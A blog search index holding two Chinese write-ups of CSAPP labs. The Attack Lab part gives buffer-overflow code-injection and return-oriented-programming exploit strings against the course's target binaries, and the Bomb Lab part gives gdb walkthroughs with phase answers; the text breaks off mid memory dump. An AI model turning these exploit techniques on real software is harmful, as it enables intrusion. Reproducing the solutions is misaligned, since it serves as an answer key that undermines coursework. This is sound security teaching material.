<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Attack Lab</title>
    <link href="/2023/12/18/Attack-Lab/"/>
    <url>/2023/12/18/Attack-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Code-Injection"><a href="#Code-Injection" class="headerlink" title="Code Injection"></a>Code Injection</h1><p>利用<strong>缓冲区溢出</strong>，攻击 <code>ctarget</code>。</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>思路：找到 <code>touch1</code> 的起始地址，使得从 <code>getbuf</code> 返回时会将控制转移到 <code>touch1</code>。</p><p>disas getbuf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">sub    $0x28,%rsp  <br></code></pre></td></tr></table></figure><p>发现分配了40个字节的栈帧</p><p>只需要输入48个字符，前40个字节将 <code>getbuf</code> 的栈空间填满，后8个字节将返回值覆盖为 <code>touch1</code> 的地址。这样，在 <code>getbuf</code> 执行 <code>retq</code> 指令时，程序就会跳转执行 <code>touch1</code> 函数。</p><p>disas touch1<br>查到 <code>touch1</code> 代码地址为：0x4016ef</p><p>写输入文件时，注意字节序为小端。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>ef 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./hex2raw &lt; 1.txt | ./ctarget -q<br></code></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>第二关中，不仅需要修改返回地址，利用 <code>ret</code> 指令将控制转移到 <code>touch2</code>，还需要传入一个参数，要求与 cookie 的值相同。</p><p>思路：在攻击字符串中注入少量代码。通过两次 <code>ret</code>，先返回到注入的攻击代码处，再返回 <code>touch2</code>。</p><p><img src="/images/Attack-Lab/2.png"><br>查看 <code>getbuf</code> 分配栈帧后，%rsp 指向 0x55622bd8，第一次应返回此处。</p><p>注入代码应：</p><ul><li>将 cookie 的值存入第一个参数寄存器 %rdi</li><li>将 <code>touch2</code> 的地址压栈</li><li>ret</li></ul><p>查看 cookie 值为：0x704163d2</p><p>disas touch2<br>查到 <code>touch2</code> 代码地址为：0x40171b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">movq    $0x704163d2, %rdi<br>pushq   $0x40171b<br>ret<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -c 2.s<br>objdump -d 2.o &gt; 2.d<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">48 c7 c7 d2 63 41 70 68<br>1b 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>d8 2b 62 55 00 00 00 00<br></code></pre></td></tr></table></figure><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>第三关中，要传递字符串作为参数。</p><p>调用 <code>touch3</code> 和 <code>hexmatch</code> 函数时，会将数据压入栈中，覆盖 <code>getbuf</code> 使用的缓冲区内存。为了避免被覆盖，应该把 cookie 字符串数据存在 <code>test</code> 的栈上。</p><p><img src="/images/Attack-Lab/3.png"><br>查看 <code>test</code> 分配栈帧后，%rsp 指向 0x55622c08。<br>（或者不用查看，根据2直接算：0x55622c08 &#x3D; 0x55622bd8 + 0x28 + 0x8）<br>这就是字符串要存放的地址，也是调用 <code>touch3</code> 时传入的参数。</p><p>disas touch3<br>查到 <code>touch3</code> 代码地址为：0x4017ef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">movq    $0x55622c08, %rdi<br>pushq   $0x4017ef<br>ret<br></code></pre></td></tr></table></figure><p>输入56个字节。开头40个字节放注入代码的字节表示，中间8个字节放注入代码的地址用来覆盖返回地址，最后8个字节放 cookie 的 ASCII 码。</p><p>cookie 值 0x704163d2 转 ASCII 为：37 30 34 31 36 33 64 32 00</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">48 c7 c7 08 2c 62 55 68<br>ef 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>d8 2b 62 55 00 00 00 00<br>37 30 34 31 36 33 64 32<br>00<br></code></pre></td></tr></table></figure><h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h1><p>攻击 <code>rtarget</code>：栈随机化 + 栈上代码不可执行，现在怎么办？<br>在已经存在的程序中找到特定的以 <code>ret</code> 结尾的指令序列为我们所用，把要用到部分的地址压入栈中，每次 <code>ret</code> 后又会取出下一个 gadget。这样就能形成一个程序链，实现攻击。<br>需要从 gadget farm 中，找出有用的 gadget，执行类似于上面第2关和第3关的攻击。</p><p><img src="/images/Attack-Lab/ROP.png" alt="ROP"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>重复2的攻击，也就是需要拼出下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">movq    $0x704163d2, %rdi<br>pushq   $0x40171b<br>ret<br></code></pre></td></tr></table></figure><p>将 cookie 放在栈上，再借助 gadget 里的 pop 指令，将存入的 cookie 弹出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm"># gadget<br>popq %rdi # 5f<br>ret<br></code></pre></td></tr></table></figure><p>但是，farm 中找不到 5f</p><p>于是只能曲线救国，使用两个 gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm"># gadget 1<br>popq %rax # 58<br>ret<br># gadget 2<br>movq %rax, %rdi # 48 89 c7<br>ret<br></code></pre></td></tr></table></figure><p>反汇编 <code>rtarget</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">objdump -d rtarget &gt; rtarget.s<br></code></pre></td></tr></table></figure><p>查找 58：<br><img src="/images/Attack-Lab/4_1.png"><br>地址 401885</p><p>查找 48 89 c7：<br><img src="/images/Attack-Lab/4_2.png"><br>地址 4018a6</p><hr><p>最终栈结构：<br><img src="/images/Attack-Lab/4_3.png" alt="来源 [CSAPP | Lab3-Attack Lab 深入解析 - 知乎](https://zhuanlan.zhihu.com/p/476396465)"></p><p>写入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>85 18 40 00 00 00 00 00<br>d2 63 41 70 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>1b 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>重复3的攻击，即要求：最终，%rdi 存 cookie 地址，然后返回 <code>touch3</code>。</p><p>区别在于，由于栈随机化，不再能像3中一样直接获取 cookie 字符串的地址。<br>解决方案：在代码中获取 %rsp 的地址，然后加上偏移量来确定 cookie 的地址。</p><p>怎么加？发现有一个 add 的 gadget。<br><img src="/images/Attack-Lab/5_2.png"><br>地址 4018b6</p><p>查找 mov %rax, %rdi -48 89 c7 ：<br><img src="/images/Attack-Lab/5_6.png"><br>地址 4018a6</p><p>此前，需要把基址 %rsp 移到 %rdi，偏移量移到 %rsi。</p><p>查找 mov %rsp , %___ - 48 89 e_：<br><img src="/images/Attack-Lab/5_1.png"><br>48 89 e0 - <code>mov %rsp, %rax</code><br>地址 4018bd</p><p>查找 <code>mov %rax, %rdi</code> - 48 89 c7:<br>同4，地址 4018a6</p><p>现在已经有了基址，偏移量还需要从栈上弹出，然后一顿倒寄存器。</p><p>查找 <code>popq %rax</code> - 58:<br>同4，地址 401885</p><p>逆序查找，偏移量需要从 %rax 最终移到 %rsi。但是，farm 中并没有以 %rsi 为目标的 mov 指令。<br>于是只能改用低字节的 movl。</p><p>查找 movl %___ , %esi:<br><img src="/images/Attack-Lab/5_3.png"><br>89 d6 - <code>movl %edx, %esi</code><br>地址 401988</p><p>查找 movl %___ , %edx:<br><img src="/images/Attack-Lab/5_4.png"><br>这里，84 c0 是 testb，对结果没有影响<br>89 ca - <code>movl %ecx, %edx</code><br>地址 4018ca</p><p>查找 movl %___ , %ecx:<br><img src="/images/Attack-Lab/5_5.png"><br>这里，84 d2 是 testb，对结果没有影响<br>89 c1 - <code>movl %eax, %ecx</code><br>地址 4018c4</p><hr><p>最终栈结构：<br><img src="/images/Attack-Lab/5.png" alt="来源 [CSAPP | Lab3-Attack Lab 深入解析 - 知乎](https://zhuanlan.zhihu.com/p/476396465)，具体寄存器并不对应"></p><p>偏移量 8 * 10 - 8 &#x3D;  72 &#x3D; 0x48 （从 getbuf 返回时，%rsp 往上挪了一格）<br>写入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>bd 18 40 00 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>85 18 40 00 00 00 00 00<br>48 00 00 00 00 00 00 00<br>c4 18 40 00 00 00 00 00<br>ca 18 40 00 00 00 00 00<br>88 19 40 00 00 00 00 00<br>b6 18 40 00 00 00 00 00<br>a6 18 40 00 00 00 00 00<br>ef 17 40 00 00 00 00 00<br>37 30 34 31 36 33 64 32<br>00<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bomb Lab</title>
    <link href="/2023/12/18/Bomb-Lab/"/>
    <url>/2023/12/18/Bomb-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="gdb-基本使用"><a href="#gdb-基本使用" class="headerlink" title="gdb 基本使用"></a>gdb 基本使用</h1><p>参考书 p194</p><p>disassemble …</p><p>break …</p><p>nexti<br>stepi</p><p>continue</p><p>x &#x2F;FMT ADDRESS<br>print EXP</p><p>run ARGS</p><h1 id="1-字符串比较"><a href="#1-字符串比较" class="headerlink" title="1 字符串比较"></a>1 字符串比较</h1><p>layout asm</p><p>disas phase_1</p><p>调用 strings_not_equal<br>要求返回0 - equal</p><p>x &#x2F;s 0x4024c0<br>“I am not part of the problem. I am a Republican.”<br>将其写入 ans.txt</p><p>break phase_1<br>run ans.txt<br>nexti<br>print $eax</p><h1 id="2-循环"><a href="#2-循环" class="headerlink" title="2 循环"></a>2 循环</h1><p>disas phase_2</p><p>调用 read_six_numbers：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mov    $<span class="hljs-number">0x4027b5</span>,%esi     <br></code></pre></td></tr></table></figure><p>x &#x2F;s 0x4027b5<br>“%d %d %d %d %d %d”</p><p>调用 sscanf：</p><table><thead><tr><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%rcx</th><th>%r8</th><th>%r9</th><th>(%rsp)</th><th>(%rsp+8)</th></tr></thead><tbody><tr><td>str</td><td>fmt</td><td>%rsp</td><td>%rsp + 4</td><td>%rsp + 8</td><td>%rsp + 12</td><td>%rsp + 16</td><td>%rsp + 20</td></tr></tbody></table><p>循环：第一个数为1，后面依次翻倍<br>1 2 4 8 16 32</p><h1 id="3-条件-分支"><a href="#3-条件-分支" class="headerlink" title="3 条件&#x2F;分支"></a>3 条件&#x2F;分支</h1><p>disas phase_3</p><p>调用 sscanf：</p><table><thead><tr><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%rcx</th></tr></thead><tbody><tr><td>str</td><td>fmt</td><td>%rsp + 12</td><td>%rsp + 8</td></tr></tbody></table><p>x &#x2F;s 0x4027c1<br>“%d %d”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cmpl   $<span class="hljs-number">0x7</span>,<span class="hljs-number">0xc</span>(%rsp)<br>ja<br></code></pre></td></tr></table></figure><p>第一个数 &lt;&#x3D; 7</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">jmpq   *<span class="hljs-number">0x402520</span>(,%rax,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>不妨令第一个数 &#x3D; 1<br>x &#x2F;x 0x402528<br>0x00400fc9</p><p>第二个数 0x52</p><h1 id="4-递归调用和栈"><a href="#4-递归调用和栈" class="headerlink" title="4 递归调用和栈"></a>4 递归调用和栈</h1><p>disas phase_4</p><p>同3，调用 sscanf：</p><table><thead><tr><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%rcx</th></tr></thead><tbody><tr><td>str</td><td>fmt</td><td>%rsp + 12</td><td>%rsp + 8</td></tr></tbody></table><p>x &#x2F;s 0x4027c1<br>“%d %d”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cmpl   $<span class="hljs-number">0xe</span>,<span class="hljs-number">0xc</span>(%rsp)<br>jbe<br></code></pre></td></tr></table></figure><p>第一个数 &lt;&#x3D; 14</p><p>调用 func4：</p><table><thead><tr><th>%rdi</th><th>%rsi</th><th>%rdx</th></tr></thead><tbody><tr><td>第一个数</td><td>0</td><td>14</td></tr></tbody></table><p>disas func4</p><p>递归调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cmp    $<span class="hljs-number">0xf</span>,%eax <br></code></pre></td></tr></table></figure><p>要求返回值为f<br>第一个数 &#x3D; 5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cmpl   $<span class="hljs-number">0xf</span>,<span class="hljs-number">0x8</span>(%rsp)   <br></code></pre></td></tr></table></figure><p>第二个数 &#x3D; f</p><h1 id="5-指针"><a href="#5-指针" class="headerlink" title="5 指针"></a>5 指针</h1><p>disas phase_5</p><p>调用 string_length</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cmp    $<span class="hljs-number">0x6</span>,%eax <br>je<br></code></pre></td></tr></table></figure><p>要求字符串长度为6</p><p>进入循环：<br>循环6次，结果 %edx&#x3D;0x37</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">movzbl (%rbx,%rax,<span class="hljs-number">1</span>),%ecx <br>and    $<span class="hljs-number">0xf</span>,%ecx<br>add    <span class="hljs-number">0x402560</span>(,%rcx,<span class="hljs-number">4</span>),%edx  <br></code></pre></td></tr></table></figure><p>x &#x2F;6x 0x402560<br>2 a 6 1 c 10</p><p>16+12+10+10+6+1&#x3D;55<br>ASCII 码末四位作为索引 5 4 1 1 2 3<br>edaabc</p><h1 id="6-链表-指针-结构"><a href="#6-链表-指针-结构" class="headerlink" title="6 链表&#x2F;指针&#x2F;结构"></a>6 链表&#x2F;指针&#x2F;结构</h1><p>disas phase_6</p><p>调用 read_six_numbers<br>放到从 %rsp+0x30 开始处</p><p>大循环1：<br>六个数都不同，并且均 &lt;&#x3D; 6</p><p>循环2：<br>x &#x2F;24 0x6042f0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x6042f0</span> &lt;node1&gt;:       <span class="hljs-number">0</span>x00000271      <span class="hljs-number">0</span>x00000001      <span class="hljs-number">0</span>x00604300      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x604300</span> &lt;node2&gt;:       <span class="hljs-number">0</span>x000002f2      <span class="hljs-number">0</span>x00000002      <span class="hljs-number">0</span>x00604310      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x604310</span> &lt;node3&gt;:       <span class="hljs-number">0</span>x00000111      <span class="hljs-number">0</span>x00000003      <span class="hljs-number">0</span>x00604320      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x604320</span> &lt;node4&gt;:       <span class="hljs-number">0</span>x00000231      <span class="hljs-number">0</span>x00000004      <span class="hljs-number">0</span>x00604330      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x604330</span> &lt;node5&gt;:       <span class="hljs-number">0</span>x0000016e      <span class="hljs-number">0</span>x00000005      <span class="hljs-number">0</span>x00604340      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x604340</span> &lt;node6&gt;:       <span class="hljs-number">0</span>x0000022f      <span class="hljs-number">0</span>x00000006      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000<br><br><span class="hljs-attribute">0x6042f0</span> &lt;node1&gt;:       <span class="hljs-number">625</span>     <span class="hljs-number">1</span>       <span class="hljs-number">6308608</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">0x604300</span> &lt;node2&gt;:       <span class="hljs-number">754</span>     <span class="hljs-number">2</span>       <span class="hljs-number">6308624</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">0x604310</span> &lt;node3&gt;:       <span class="hljs-number">273</span>     <span class="hljs-number">3</span>       <span class="hljs-number">6308640</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">0x604320</span> &lt;node4&gt;:       <span class="hljs-number">561</span>     <span class="hljs-number">4</span>       <span class="hljs-number">6308656</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">0x604330</span> &lt;node5&gt;:       <span class="hljs-number">366</span>     <span class="hljs-number">5</span>       <span class="hljs-number">6308672</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">0x604340</span> &lt;node6&gt;:       <span class="hljs-number">559</span>     <span class="hljs-number">6</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>struct 链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-type">int</span> val;<br>    <span class="hljs-type">int</span> ordinal;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>struct 链表中6个 struct 的地址，按照输入数字的顺序，顺着放到 %rsp +</p><p>循环3：<br>x &#x2F;12 0x7fffffffe660<br>0x7fffffffe660: 6308608 0       6308592 0<br>0x7fffffffe670: 6308640 0       6308672 0<br>0x7fffffffe680: 6308656 0       6308624 0</p><p>重排链表</p><p>循环4：<br>x &#x2F;24x 0x6042f0</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x6042f0</span> &lt;node1&gt;:       <span class="hljs-number">0x00000271</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00604320</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x604300</span> &lt;node2&gt;:       <span class="hljs-number">0</span>x<span class="hljs-number">000002f2</span>      <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0</span>x<span class="hljs-number">006042f0</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x604310</span> &lt;node3&gt;:       <span class="hljs-number">0x00000111</span>      <span class="hljs-number">0x00000003</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x604320</span> &lt;node4&gt;:       <span class="hljs-number">0x00000231</span>      <span class="hljs-number">0x00000004</span>      <span class="hljs-number">0x00604340</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x604330</span> &lt;node5&gt;:       <span class="hljs-number">0</span>x0000016e      <span class="hljs-number">0x00000005</span>      <span class="hljs-number">0x00604310</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x604340</span> &lt;node6&gt;:       <span class="hljs-number">0</span>x0000022f      <span class="hljs-number">0x00000006</span>      <span class="hljs-number">0x00604330</span>      <span class="hljs-number">0x00000000</span><br></code></pre></td></tr></table></figure><p>验证每个 struct 的 val &gt;&#x3D; 链表中下一项的 val<br>val 从大到小：2 1 4 6 5 3</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret phase"></a>secret phase</h1><p>在 phase_defused 中调了 secret_phase：<br>b *0x401772</p><p>(gdb) x &#x2F;s 0x402660<br>0x402660:       “Curses, you’ve found the secret phase!”<br>(gdb) x &#x2F;s 0x402688<br>0x402688:       “But finding it and solving it are quite different…”<br>找对了位置🤗</p><p>先调用 sscanf：<br>(gdb) x &#x2F;s 0x40280b<br>0x40280b:       “%d %d %s”<br>三个输入</p><p>phase_3 or phase_4? 与 phase_4 读取的 %rdi 地址相同<br>(gdb) x &#x2F;s 0x6048b0<br>0x6048b0 &lt;input_strings+240&gt;:   “5 15 DrEvil”<br><img src="/images/Bomb-Lab/1.png"></p><p>(gdb) x &#x2F;s 0x402814<br>0x402814:       “DrEvil”<br>取第三个输入判等</p><p>综上，在 phase_4 的输入之后再补一个 DrEvil</p><hr><p>secret_phase：</p><p>调用 read_line，读入一个字符串<br>调用 strtol，解析为十进制 num<br>num - 1 &lt;&#x3D; 1000</p><p>调用 fun7：</p><table><thead><tr><th>%rdi</th><th>%rsi</th></tr></thead><tbody><tr><td>0x604110</td><td>num</td></tr></tbody></table><p>要求返回值为5</p><p>fun7：<br>递归调用，比较 num 与 (%rdi)+</p><p>x &#x2F;100xg 0x604110</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x604110</span> &lt;n1&gt;:  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000024</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604130</span><br><span class="hljs-number">0x604120</span> &lt;n1+<span class="hljs-number">16</span>&gt;:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604150</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604130</span> &lt;n21&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000008</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00006041b0</span><br><span class="hljs-number">0x604140</span> &lt;n21+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604170</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604150</span> &lt;n22&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000032</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604190</span><br><span class="hljs-number">0x604160</span> &lt;n22+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x000000<span class="hljs-number">00006041d0</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604170</span> &lt;n32&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000016</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000604290</span><br><span class="hljs-number">0x604180</span> &lt;n32+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604250</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604190</span> &lt;n33&gt;: <span class="hljs-number">0</span>x000000000000002d      <span class="hljs-number">0</span>x000000<span class="hljs-number">00006041f0</span><br><span class="hljs-number">0x6041a0</span> &lt;n33+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x000000<span class="hljs-number">00006042b0</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6041b0</span> &lt;n31&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000006</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604210</span><br><span class="hljs-number">0x6041c0</span> &lt;n31+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000604270</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6041d0</span> &lt;n34&gt;: <span class="hljs-number">0</span>x000000000000006b      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000604230</span><br><span class="hljs-number">0x6041e0</span> &lt;n34+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x000000<span class="hljs-number">00006042d0</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6041f0</span> &lt;n45&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000028</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604200</span> &lt;n45+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604210</span> &lt;n41&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000001</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604220</span> &lt;n41+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604230</span> &lt;n47&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000063</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604240</span> &lt;n47+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604250</span> &lt;n44&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000023</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604260</span> &lt;n44+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604270</span> &lt;n42&gt;: 